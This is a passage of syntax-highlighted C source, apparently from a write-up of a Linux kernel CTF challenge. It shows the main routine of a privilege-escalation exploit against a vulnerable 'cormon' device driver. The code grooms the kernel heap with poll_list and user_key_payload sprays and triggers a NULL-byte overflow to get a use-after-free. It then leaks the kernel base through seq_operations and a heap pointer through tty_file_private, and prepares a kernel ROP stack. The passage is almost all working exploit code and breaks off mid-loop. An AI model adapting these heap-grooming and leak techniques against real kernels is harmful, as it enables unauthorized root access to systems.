&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>(&lt;span style="color:#66d9ef">int&lt;/span> argc, &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>argv[]) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>keybuf &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">malloc&lt;/span>(&lt;span style="color:#ae81ff">0x5000&lt;/span>); &lt;span style="color:#75715e">// must be &amp;gt;= 0x4330 (low 2byte of single_next())
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#a6e22e">puts&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;[.] Starting exploit.&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">puts&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;[+] preparing stack for later kROP...&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">save_state&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> krop_stack &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">mmap&lt;/span>((&lt;span style="color:#66d9ef">void&lt;/span>&lt;span style="color:#f92672">*&lt;/span>)&lt;span style="color:#ae81ff">0x10000000&lt;/span>, KROP_USTACK_SIZE, PROT_READ &lt;span style="color:#f92672">|&lt;/span> PROT_WRITE, MAP_PRIVATE &lt;span style="color:#f92672">|&lt;/span> MAP_ANONYMOUS &lt;span style="color:#f92672">|&lt;/span> MAP_FIXED, &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (krop_stack &lt;span style="color:#f92672">==&lt;/span> MAP_FAILED) &lt;span style="color:#a6e22e">errExit&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;mmap&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">assign_to_core&lt;/span>(&lt;span style="color:#ae81ff">0&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ((cormon_fd &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">open&lt;/span>(DEV_PATH, O_RDWR)) &lt;span style="color:#f92672">&amp;lt;=&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>) &lt;span style="color:#a6e22e">errExit&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;open cormon&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// Pre-spray kmalloc-32
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#a6e22e">puts&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;[+] pre-spraying kmalloc-32...&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> (&lt;span style="color:#66d9ef">int&lt;/span> ix &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>; ix &lt;span style="color:#f92672">!=&lt;/span> NUM_PREPARE_KM32_SPRAY; &lt;span style="color:#f92672">++&lt;/span>ix) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#a6e22e">open&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;/proc/self/stat&amp;#34;&lt;/span>, O_RDONLY) &lt;span style="color:#f92672">&amp;lt;=&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>) &lt;span style="color:#a6e22e">errExit&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;prespray&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// Spray victim `user_key_payload` in kmalloc-32
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#a6e22e">puts&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;[+] Spraying keys...&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">spray_keys&lt;/span>(NUM_KEY_SPRAY, &lt;span style="color:#e6db74">&amp;#39;A&amp;#39;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// Spray poll_list in kmalloc-32 and kmalloc-4k
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> just_fd &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">open&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;/etc/hosts&amp;#34;&lt;/span>, O_RDONLY);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">printf&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;[+] Spraying poll_list (fd=%d)...&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>, just_fd);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (just_fd &lt;span style="color:#f92672">&amp;lt;=&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>) &lt;span style="color:#a6e22e">errExit&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;just_fd&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">assign_to_core&lt;/span>(&lt;span style="color:#ae81ff">1&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> num_threads &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> (&lt;span style="color:#66d9ef">int&lt;/span> ix &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>; ix &lt;span style="color:#f92672">!=&lt;/span> NUM_1ST_POLLLIST_ALLOC &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">3&lt;/span>; &lt;span style="color:#f92672">++&lt;/span>ix) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">struct&lt;/span> &lt;span style="color:#66d9ef">alloc_poll_list_t&lt;/span> &lt;span style="color:#f92672">*&lt;/span>arg &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">malloc&lt;/span>(&lt;span style="color:#66d9ef">sizeof&lt;/span>(&lt;span style="color:#66d9ef">struct&lt;/span> &lt;span style="color:#66d9ef">alloc_poll_list_t&lt;/span>));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> arg&lt;span style="color:#f92672">-&amp;gt;&lt;/span>fd &lt;span style="color:#f92672">=&lt;/span> just_fd; arg&lt;span style="color:#f92672">-&amp;gt;&lt;/span>id &lt;span style="color:#f92672">=&lt;/span> ix;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> arg&lt;span style="color:#f92672">-&amp;gt;&lt;/span>timeout_ms &lt;span style="color:#f92672">=&lt;/span> ix &lt;span style="color:#f92672">&amp;lt;&lt;/span> NUM_1ST_POLLLIST_ALLOC &lt;span style="color:#f92672">?&lt;/span> TIMEOUT_POLLFD : &lt;span style="color:#ae81ff">1&lt;/span>;;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> arg&lt;span style="color:#f92672">-&amp;gt;&lt;/span>num_size &lt;span style="color:#f92672">=&lt;/span> NUM_POLLFD;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span>(&lt;span style="color:#a6e22e">pthread_create&lt;/span>(&lt;span style="color:#f92672">&amp;amp;&lt;/span>threads[ix], NULL, alloc_poll_list, arg) &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>) &lt;span style="color:#a6e22e">errExit&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;pthread_create&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// Wait some of `poll_list` in kmalloc-4k is freed (these are expected to be reused by cormon_proc_write())
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#a6e22e">assign_to_core&lt;/span>(&lt;span style="color:#ae81ff">0&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">usleep&lt;/span>(&lt;span style="color:#ae81ff">500&lt;/span> &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">1000&lt;/span>); &lt;span style="color:#75715e">// wait threads are initialized
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">for&lt;/span>(&lt;span style="color:#66d9ef">int&lt;/span> ix &lt;span style="color:#f92672">=&lt;/span> NUM_1ST_POLLLIST_ALLOC; ix &lt;span style="color:#f92672">&amp;lt;&lt;/span> NUM_1ST_POLLLIST_ALLOC &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">3&lt;/span>; &lt;span style="color:#f92672">++&lt;/span>ix) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">pthread_join&lt;/span>(threads[ix], NULL);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// Spray again victim `user_key_payload` in kmalloc-32
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#a6e22e">spray_keys&lt;/span>(NUM_KEY_SPRAY, &lt;span style="color:#e6db74">&amp;#39;A&amp;#39;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// NULL-byte overflow (hopelly) on `poll_list`, whose `next` pointer get pointing to `user_key_payload` in kmalloc-32.
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#a6e22e">puts&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;[+] NULL-byte overflow ing...&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">nullbyte_overflow&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// Wait all `poll_list` are freed
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">for&lt;/span> (&lt;span style="color:#66d9ef">int&lt;/span> ix &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>; ix &lt;span style="color:#f92672">!=&lt;/span> NUM_1ST_POLLLIST_ALLOC; &lt;span style="color:#f92672">++&lt;/span>ix) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">open&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;/proc/self/stat&amp;#34;&lt;/span>, O_RDONLY);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">pthread_join&lt;/span>(threads[ix], NULL);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">puts&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;[+] Freed all &amp;#39;poll_list&amp;#39;&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// Place `seq_operations` on UAFed `user_key_payload` in kmalloc-32
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">for&lt;/span>(&lt;span style="color:#66d9ef">int&lt;/span> ix &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>; ix &lt;span style="color:#f92672">!=&lt;/span> NUM_SEQOPERATIONS; &lt;span style="color:#f92672">++&lt;/span>ix) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ((seqops_fd[ix] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">open&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;/proc/self/stat&amp;#34;&lt;/span>, O_RDONLY)) &lt;span style="color:#f92672">&amp;lt;=&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>) &lt;span style="color:#a6e22e">errExit&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;open seqops&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// Check all keys to leak kbase via `seq_operations`
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> ulong single_show &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">key_serial_t&lt;/span> uafed_key &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> (&lt;span style="color:#66d9ef">int&lt;/span> ix &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>; ix &lt;span style="color:#f92672">!=&lt;/span> NUM_KEY_SPRAY &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>; &lt;span style="color:#f92672">++&lt;/span>ix) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">int&lt;/span> num_read;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">memset&lt;/span>(keybuf, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">0x5000&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span>((num_read &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">keyctl_read&lt;/span>(keys[ix], keybuf, &lt;span style="color:#ae81ff">0x5000&lt;/span>)) &lt;span style="color:#f92672">&amp;lt;=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>) &lt;span style="color:#a6e22e">errExit&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;keyctl_read&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#a6e22e">strncmp&lt;/span>(keybuf, &lt;span style="color:#e6db74">&amp;#34;AAAA&amp;#34;&lt;/span>, &lt;span style="color:#ae81ff">4&lt;/span>) &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> single_show &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">*&lt;/span>(ulong&lt;span style="color:#f92672">*&lt;/span>)keybuf;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> uafed_key &lt;span style="color:#f92672">=&lt;/span> keys[ix];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (single_show &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">puts&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;[-] somehow, empty key found&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">else&lt;/span> &lt;span style="color:#66d9ef">break&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (single_show &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">puts&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;[-] Failed to leak kbase&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">exit&lt;/span>(&lt;span style="color:#ae81ff">1&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">printf&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;[!] leaked single_show: 0x%lx&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>, single_show);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> kbase &lt;span style="color:#f92672">=&lt;/span> single_show &lt;span style="color:#f92672">-&lt;/span> (&lt;span style="color:#ae81ff">0xffffffff813275c0&lt;/span> &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">0xffffffff81000000&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">printf&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;[!] leaked kbase: 0x%lx&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>, kbase);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// Free all keys except UAFed key
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">for&lt;/span> (&lt;span style="color:#66d9ef">int&lt;/span> ix &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>; ix &lt;span style="color:#f92672">!=&lt;/span> NUM_KEY_SPRAY &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>; &lt;span style="color:#f92672">++&lt;/span>ix) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (keys[ix] &lt;span style="color:#f92672">!=&lt;/span> uafed_key) &lt;span style="color:#a6e22e">free_key&lt;/span>(keys[ix]);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">sleep&lt;/span>(&lt;span style="color:#ae81ff">1&lt;/span>); &lt;span style="color:#75715e">// wait GC(security/keys/gc.c) actually frees keys
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// Place `tty_file_private` on UAFed `user_key_payload` in kmalloc-32
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">for&lt;/span> (&lt;span style="color:#66d9ef">int&lt;/span> ix &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>; ix &lt;span style="color:#f92672">!=&lt;/span> NUM_TTY_SPRAY; &lt;span style="color:#f92672">++&lt;/span>ix) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ((tty_fd[ix] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">open&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;/dev/ptmx&amp;#34;&lt;/span>, O_RDWR &lt;span style="color:#f92672">|&lt;/span> O_NOCTTY)) &lt;span style="color:#f92672">&amp;lt;=&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>) &lt;span style="color:#a6e22e">errExit&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;open tty&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// Read `tty_file_private.tty` which points to `tty_struct` in kmalloc-1024
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#a6e22e">memset&lt;/span>(keybuf, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">0x5000&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">int&lt;/span> num_read &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span>((num_read &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">keyctl_read&lt;/span>(uafed_key, keybuf, &lt;span style="color:#ae81ff">0x5000&lt;/span>)) &lt;span style="color:#f92672">&amp;lt;=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>) &lt;span style="color:#a6e22e">errExit&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;keyctl_read&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">printf&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;[+] read 0x%x bytes from UAFed key&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>, num_read);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ulong km1024_leaked &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ulong &lt;span style="color:#f92672">*&lt;/span>tmp &lt;span style="color:#f92672">=&lt;/span> (ulong&lt;span style="color:#f92672">*&lt;/span>)keybuf &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> (&lt;span style="color:#66d9ef">int&lt;/span> ix &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>; ix &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#ae81ff">0x4330&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">8&lt;/span> &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>; &lt;span style="color:#f92672">++&lt;/span>ix) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> (tmp[ix] &lt;span style="color:#f92672">&amp;gt;&amp;gt;&lt;/span> (&lt;span style="color:#ae81ff">64&lt;/span>&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">4&lt;/span>&lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#ae81ff">4&lt;/span>)) &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">0xFFFF&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#75715e">// tty must be in kheap
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> (tmp[ix &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>] &lt;span style="color:#f92672">&amp;gt;&amp;gt;&lt;/span> (&lt;span style="color:#ae81ff">64&lt;/span>&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">4&lt;/span>&lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#ae81ff">4&lt;/span>)) &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">0xFFFF&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#75715e">// file must be in kheap
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> tmp[ix&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>] &lt;span style="color:#f92672">==&lt;/span> tmp[ix&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">3&lt;/span>] &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> tmp[ix&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>] &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#75715e">// list_head&amp;#39;s next and prev are same
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> (tmp[ix] &lt;span style="color:#f92672">&amp;amp;&lt;/span> &lt;span style="color:#ae81ff">0xFF&lt;/span>) &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">0x00&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#75715e">// tty must be 0x100 aligned
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> (tmp[ix &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>] &lt;span style="color:#f92672">&amp;amp;&lt;/span> &lt;span style="color:#ae81ff">0xFF&lt;/span>) &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">0x00&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#75715e">// file must be 0x100 aligned
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> (tmp[ix &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>] &lt;span style="color:#f92672">&amp;amp;&lt;/span> &lt;span style="color:#ae81ff">0xF&lt;/span>) &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">0x08&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (km1024_leaked &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> km1024_leaked &lt;span style="color:#f92672">=&lt;/span> tmp[ix];
